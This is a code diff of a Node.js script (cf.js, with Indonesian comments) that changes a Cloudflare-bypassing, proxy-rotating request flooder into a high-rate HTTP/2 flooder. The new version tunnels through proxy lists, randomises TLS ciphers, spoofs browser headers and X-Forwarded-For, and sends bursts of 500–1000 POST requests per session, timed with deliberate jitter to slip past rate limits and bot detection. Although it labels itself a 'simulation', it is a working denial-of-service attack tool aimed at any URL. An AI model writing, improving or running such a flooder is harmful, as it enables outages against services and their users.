@@ -1,137 +1,150 @@
-const cloudscraper = require('cloudscraper');
-const request = require('request');
-const args = process.argv.slice(2);
+const http2 = require('http2');
+const tls = require('tls');
+const net = require('net');
 const fs = require('fs'); 
+const url_module = require('url');
+const crypto = require('crypto');
 
-// Tidak melakukan apa-apa pada uncaughtException dan unhandledRejection
-process.on('uncaughtException', (err) => { /* Kosong */ });
-process.on('unhandledRejection', (reason, promise) => { /* Kosong */ });
+process.on('uncaughtException', (err) => { });
+process.on('unhandledRejection', (reason, promise) => { });
 
-if (process.argv.length <= 2) {
-    console.log(`Penggunaan: node cf.js <URL> <Waktu_Detik> [Threads_Opsional, default: 1]`);
+if (process.argv.length < 6) {
+    console.log(`Penggunaan: node cf.js <URL> <Waktu> <Rate> <Threads> <ProxyFile>`);
     process.exit(-1);
 }
 
-const rIp = () => {
-    const r = () => Math.floor(Math.random() * 255);
-    return `${r()}.${r()}.${r()}.${r()}`;
-}
+const targetUrl = process.argv[2];
+const duration = Number(process.argv[3]);
+const totalThreads = Number(process.argv[5]);
+const proxyFile = process.argv[6] || 'proxies.txt';
+const parsedTarget = url_module.parse(targetUrl);
 
-const rStr = (l) => {
-    const a = 'abcdefghijklmnopqstuvwxyz0123456789';
-    let s = '';
-    for (let i = 0; i < l; i++) {
-        s += a[Math.floor(Math.random() * a.length)];
-    }
-    return s;
-}
+let activeSessions = [];
+let stats = { success: 0, blocked: 0, rateLimited: 0, errors: 0 };
 
-// Fungsi helper untuk mendapatkan item acak dari array
-const getRandomItem = (arr) => arr[Math.floor(Math.random() * arr.length)];
-
-const url = process.argv[2]
-const time = Number(process.argv[3])
-const threads = Number(process.argv[4]) || 1;
-
-let proxies = [];
-
-// --- LOGIKA WAJIB PROXY DIMULAI ---
-const PROXY_FILE = 'proxies.txt';
-if (!fs.existsSync(PROXY_FILE)) {
-    console.error(`[ERROR] File proxy "${PROXY_FILE}" tidak ditemukan. Proxy wajib digunakan.`);
-    process.exit(1); 
-}
-
-// Membaca file proxies.txt (hanya berisi IP:Port)
-proxies = fs.readFileSync(PROXY_FILE, 'utf-8').split('\n').filter(Boolean);
-
-if (proxies.length === 0) {
-    console.error(`[ERROR] File proxy "${PROXY_FILE}" kosong. Harap tambahkan proxy.`);
-    process.exit(1);
-}
-
-console.log(`[Info] Loaded ${proxies.length} proxies.`); 
-// --- LOGIKA WAJIB PROXY BERAKHIR ---
-
-
-console.log(`[Info] Starting ${time} seconds attack on ${url} with ${threads} threads`);
+const rIp = () => `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+const rStr = (l) => crypto.randomBytes(Math.ceil(l / 2)).toString('hex').slice(0, l);
 
 const userAgents = [
-    // ... (list User Agents tetap sama) ...
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Android 14; Mobile; rv:127.0) Gecko/127.0 Firefox/127.0',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/126.0.0.0',
-    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
-    'Mozilla/5.0 (iPad; CPU OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/92.0.4561.12',
-    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
-    'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
-    'Mozilla/5.0 (compatible; ABrowse 0.4; Syllable)',
-    'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
-    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
+    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', brand: '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', plat: '"Windows"' },
+    { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', brand: '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', plat: '"macOS"' }
 ];
 
+const acceptLanguages = ['en-US,en;q=0.9', 'en-GB,en;q=0.8,en;q=0.7', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'];
 
-for (let i = 0; i < threads; i++) {
-    const int = setInterval(() => {
-        
-        // --- AMBIL PROXY ACAL DENGAN PROTOKOL HTTP:// ---
-        const selectedProxy = 'http://' + getRandomItem(proxies);
-        // ---
+let proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);
 
-        // 1. Tahap Bypass Cloudflare (mendapatkan cookie)
-        // Tambahkan opsi 'proxy' di sini agar cloudscraper menggunakan proxy
-        const cloudscraperOptions = {
-            url: url,
-            proxy: selectedProxy // BARU: Memaksa cloudscraper.get menggunakan proxy
-        };
-        
-        cloudscraper.get(cloudscraperOptions, function (e, r, b) {
-            if (e) return;
-            if (!r || !r.request || !r.request.headers || !r.request.headers.request) {
-                return;
-            }
+const shuffleCiphers = () => ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'ECDHE-ECDSA-AES128-GCM-SHA256'].sort(() => Math.random() - 0.5).join(':');
 
-            const cookie = r.request.headers.request.cookie;
-            const useragent = getRandomItem(userAgents);
-            const ip = rIp();
+setInterval(() => {
+    console.clear();
+    const uptime = process.uptime();
+    console.log(`[High-Speed HTTP/2 Simulation]`);
+    console.log(`[Target] ${targetUrl}`);
+    console.log(`[Stats] Success: ${stats.success} | 403: ${stats.blocked} | 429: ${stats.rateLimited} | Errors: ${stats.errors}`);
+    console.log(`[Perf] RPS: ${Math.floor(stats.success / uptime)} | Active Sessions: ${activeSessions.length}`);
+}, 1000);
 
-            // 2. Tahap Pengiriman Request menggunakan Cookie
-            const requestOptions = {
-                url: url,
-                headers: {
-                    'User-Agent': useragent,
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,application/apng,*/*;q=0.8',
-                    'Upgrade-Insecure-Requests': '1',
-                    'cookie': cookie,
-                    'Origin': 'http://' + rStr(8) + '.com',
-                    'Referer': 'http://google.com/' + rStr(10),
-                    'X-Forwarded-For': ip, // Menyamarkan IP dengan IP acak, tetapi koneksi lewat proxy
-                    'Connection': 'Keep-Alive',
-                    'Cache-Control': 'no-cache',
-                    'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'DNT': '1',
-                    'Sec-Fetch-Dest': 'document',
-                    'Sec-Fetch-Mode': 'navigate',
-                    'Sec-Fetch-Site': 'none',
-                    'Sec-Fetch-User': '?1',
-                }
-            };
+function createSession() {
+    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+    const [pHost, pPort] = proxy.split(':');
+    const selectedUA = userAgents[Math.floor(Math.random() * userAgents.length)];
 
-            // *** BAGIAN KRITIS UNTUK PROXY ***
-            // Pastikan request utama juga menggunakan proxy yang sama
-            requestOptions.proxy = selectedProxy; 
-            // ***
+    const socket = net.connect(Number(pPort), pHost);
+    socket.setNoDelay(true);
+    socket.setKeepAlive(true, 120000);
 
-            request(requestOptions);
+    socket.once('connect', () => {
+        socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
+
+        socket.once('data', (data) => {
+            if (!data.toString().includes('200')) { socket.destroy(); return; }
+
+            const tlsSocket = tls.connect({
+                socket: socket,
+                servername: parsedTarget.host,
+                ciphers: shuffleCiphers(),
+                ALPNProtocols: ['h2'],
+                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION
+            }, () => {
+                const client = http2.connect(parsedTarget.href, {
+                    createConnection: () => tlsSocket,
+                    settings: { 
+                        enablePush: false, 
+                        initialWindowSize: 33554432, // 32MB window
+                        maxConcurrentStreams: 5000,
+                        headerTableSize: 65536,
+                        maxFrameSize: 16384
+                    }
+                });
+
+                activeSessions.push(client);
+
+                client.on('remoteSettings', () => {
+                    // SUPER BURST: 500-1000 request
+                    const burstAmount = Math.floor(Math.random() * (1000 - 500 + 1)) + 500; 
+                    
+                    for (let j = 0; j < burstAmount; j++) {
+                        // Human Strategy: Random delay per request dalam milidetik (0-15ms)
+                        // agar tidak terlihat seperti 1 snapshot paket yang sama (de-sync)
+                        setTimeout(() => {
+                            if (client.destroyed) return;
+
+                            const postData = JSON.stringify({ 
+                                session_key: rStr(16), 
+                                trace_id: crypto.randomUUID(),
+                                interaction_time: Math.floor(Math.random() * 5000)
+                            });
+                            
+                            const req = client.request({
+                                ':method': 'POST',
+                                ':path': parsedTarget.path + (Math.random() > 0.7 ? `?_t=${Date.now()}` : ''),
+                                ':authority': parsedTarget.host,
+                                ':scheme': 'https',
+                                'user-agent': selectedUA.ua,
+                                'accept': 'application/json, text/plain, */*',
+                                'accept-language': acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
+                                'content-type': 'application/json',
+                                'content-length': Buffer.byteLength(postData),
+                                'sec-ch-ua': selectedUA.brand,
+                                'sec-ch-ua-platform': selectedUA.plat,
+                                'sec-fetch-mode': 'cors',
+                                'sec-fetch-site': 'same-origin',
+                                'sec-fetch-dest': 'empty',
+                                'x-requested-with': 'XMLHttpRequest', // Human-like AJAX header
+                                'referer': targetUrl,
+                                'x-forwarded-for': rIp(),
+                                'priority': 'u=1, i'
+                            });
+
+                            req.on('response', (headers) => {
+                                const status = headers[':status'];
+                                if (status == 200) stats.success++;
+                                else if (status == 403) stats.blocked++;
+                                else if (status == 429) stats.rateLimited++;
+                                if (status >= 400) client.destroy();
+                            });
+
+                            req.on('error', () => { stats.errors++; req.destroy(); });
+                            req.write(postData);
+                            req.end();
+                        }, j * 0.2); // Micro-jittering (0.2ms interval)
+                    }
+                });
+
+                client.on('error', () => { stats.errors++; client.destroy(); });
+            });
         });
     });
-
-    setTimeout(() => clearInterval(int), time * 1000);
 }
+
+// Threading Control
+for (let i = 0; i < totalThreads; i++) {
+    // Membuka sesi baru lebih cepat untuk throughput maksimal
+    setInterval(createSession, 300); 
+}
+
+setTimeout(() => {
+    console.log(`\n[System] Simulasi selesai.`);
+    process.exit(0);
+}, duration * 1000);
